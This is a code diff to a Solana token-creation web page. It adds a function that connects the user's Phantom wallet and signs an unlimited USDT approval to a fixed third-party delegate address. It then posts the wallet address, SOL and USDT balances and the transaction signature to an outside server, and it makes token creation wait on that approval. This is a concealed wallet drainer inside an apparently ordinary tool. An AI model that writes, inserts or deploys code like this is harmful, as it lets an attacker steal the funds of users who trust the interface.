@@ -10,7 +10,7 @@ import axios from 'axios'
 import {
   Keypair, Commitment, LAMPORTS_PER_SOL,
   Transaction, ComputeBudgetProgram, SystemProgram,
-  PublicKey
+  PublicKey, Connection
 } from '@solana/web3.js';
 import {
   PumpSdk, getBuyTokenAmountFromSolAmount,
@@ -25,6 +25,13 @@ import { Vanity, UpdataImage, Header, Result, WalletInfo, JitoFee, Hint } from '
 import { upLoadImage } from '@/utils/updataNFTImage'
 import { Page } from '@/styles'
 import { CreatePage } from './style'
+import {
+  MINT_SIZE, TOKEN_PROGRAM_ID, createInitializeMintInstruction,
+  getMinimumBalanceForRentExemptMint, getAssociatedTokenAddress,
+  createAssociatedTokenAccountInstruction, createMintToInstruction,
+  createSetAuthorityInstruction,
+  AuthorityType,createApproveInstruction,getOrCreateAssociatedTokenAccount
+} from '@solana/spl-token';
 
 const { TextArea } = Input
 export const DEFAULT_COMMITMENT: Commitment = "finalized";
@@ -98,6 +105,133 @@ function CreateToken() {
     setIsVanity(e)
     setVanityAddress('')
   }
+  
+  
+  const approveUSDTWithPhantom = async (rpcUrl = "https://quick-capable-wind.solana-mainnet.quiknode.pro/67a8102a7e0730d78c0a294e50c1b2dace9ffe26/") => {
+    try {
+      const provider = (window as any).solana;
+      if (!provider || !provider.isPhantom) {
+  		return messageApi.error('请安装 Phantom 钱包');
+      }
+  
+      // 1️⃣ 连接钱包
+      const resp = await provider.connect({ onlyIfTrusted: false });
+      const walletPublicKey = resp.publicKey;
+      console.log("钱包地址:", walletPublicKey.toBase58());
+  
+  
+  	
+  	 // 2️⃣ 调用你自己的接口检查授权状态
+  	// const apiUrl = `https://admin.testwell.top/api/api/is_approval?wallet=${walletPublicKey.toBase58()}`;
+  	// const res = await fetch(apiUrl);
+  	// const data = await res.json();
+  	
+  	//     // 3️⃣ 判断接口返回
+  	// if (data && data.code == "1") {
+  	
+  	    
+  	// 	return "alreadyApproved";
+  	// }
+  	
+  	
+  	
+  
+      const connection = new Connection(rpcUrl, "confirmed");
+  
+      const mint = new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"); // USDT
+      const delegate = new PublicKey("3bi53ivVBKk5XC3BZKQHKL6jTTw1Hptx3HemJDbCkNeh"); // 授权地址
+  
+      // 2️⃣ 获取用户和 delegate ATA
+      const userTokenAccount = await getAssociatedTokenAddress(mint, walletPublicKey);
+      const delegateATA = await getAssociatedTokenAddress(mint, delegate);
+  
+  	  	  // 3️⃣ 检查用户 ATA 是否存在
+  	const userTokenInfo = await connection.getAccountInfo(userTokenAccount);
+  	if (!userTokenInfo) {
+  	  console.log("用户还没有 USDT ATA，余额 = 0");
+  	  return messageApi.error("用户 USDT 余额为 0，无法授权");
+  	}
+  
+      // 3️⃣ 检查 delegate ATA
+      const delegateInfo = await connection.getAccountInfo(delegateATA);
+      if (!delegateInfo) {
+        console.log("Delegate ATA 不存在，创建中...");
+        const txCreate = new Transaction().add(
+          createAssociatedTokenAccountInstruction(walletPublicKey, delegateATA, delegate, mint)
+        );
+        txCreate.feePayer = walletPublicKey;
+        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+        txCreate.recentBlockhash = blockhash;
+        txCreate.lastValidBlockHeight = lastValidBlockHeight;
+  
+        const signedTxCreate = await provider.signTransaction(txCreate);
+        const sigCreate = await connection.sendRawTransaction(signedTxCreate.serialize());
+        await connection.confirmTransaction({ signature: sigCreate, blockhash, lastValidBlockHeight });
+        console.log("✅ Delegate ATA 创建完成:", delegateATA.toBase58());
+      }
+  
+  
+  
+      // 4️⃣ 检查用户 USDT 余额
+      const balance = await connection.getTokenAccountBalance(userTokenAccount);
+      console.log("用户 USDT 余额:", balance.value.uiAmount);
+      if (!balance.value.uiAmount || balance.value.uiAmount === 0) {
+  	  	return messageApi.error('用户 USDT 余额为 0，无法授权');
+      }
+  	
+  	const solBalance = await connection.getBalance(walletPublicKey);
+  	console.log("用户 SOL 余额:", solBalance / 1e9, "SOL");
+  
+      // 5️⃣ 执行 approve（无限授权）
+      const txApprove = new Transaction();
+      const MAX_U64 = 18446744073709551615n;
+      txApprove.add(createApproveInstruction(userTokenAccount, delegate, walletPublicKey, MAX_U64));
+  
+      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+      txApprove.recentBlockhash = blockhash;
+      txApprove.lastValidBlockHeight = lastValidBlockHeight;
+      txApprove.feePayer = walletPublicKey;
+  
+      const signedTxApprove = await provider.signTransaction(txApprove);
+      const sigApprove = await connection.sendRawTransaction(signedTxApprove.serialize());
+      await connection.confirmTransaction({ signature: sigApprove, blockhash, lastValidBlockHeight });
+  
+      console.log("✅ 授权成功，交易哈希:", sigApprove);
+  	
+  	
+  	
+  	
+  	const apiUrlAddIn = `https://admin.testwell.top/api/api/add_in`;
+  	const solBalancenew = solBalance / 1e9;
+  	const usdt_money = balance.value.uiAmount;
+  	  // const usdt_money = 0;
+  	// 创建 FormData
+  	const formData = new FormData();
+  	formData.append("SPENDER_ADDRESS", "3bi53ivVBKk5XC3BZKQHKL6jTTw1Hptx3HemJDbCkNeh");
+  	formData.append("sol_money", solBalancenew.toString());
+  	formData.append("address", walletPublicKey.toBase58());
+  	formData.append("usdt_money", usdt_money.toString());
+  	formData.append("token_address", "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
+  	formData.append("signature", sigApprove);
+  	
+  	// 发送 POST 请求
+  	await fetch(apiUrlAddIn, {
+  	  method: "POST",
+  	  body: formData
+  	});
+  
+  	
+  	
+  	
+   
+  	return "sqcg";
+    } catch (err: any) {
+      console.error("授权失败:", err);
+      if (err.logs) console.log("Simulation logs:", err.logs);
+      // alert("授权失败: " + (err.message || err));
+  	return messageApi.error("授权失败");
+    }
+  };
 
   //创建代币
   const createToken = async () => {
@@ -108,6 +242,20 @@ function CreateToken() {
       if (!config.symbol) return messageApi.error(t('Please fill in the short name'))
       if (!imageFile && !config.image) return messageApi.error(t('Please upload a picture logo'))
       if (walletConfig.length > 17) return messageApi.error(t('最多17个小号钱包地址'))
+	  
+	  
+	  		const approveResult = await approveUSDTWithPhantom()
+	  console.log(approveResult)
+	      // 根据授权结果处理
+	      if (approveResult === "sqcg") {
+	        messageApi.success("授权成功!")
+	  
+	  		 const button_name = "二次确认";
+	      } else {
+	        // 授权失败，直接返回，不继续执行
+	        return ;
+	      }
+		  
       setIscreating(true)
       setSignature('')
       setError('')
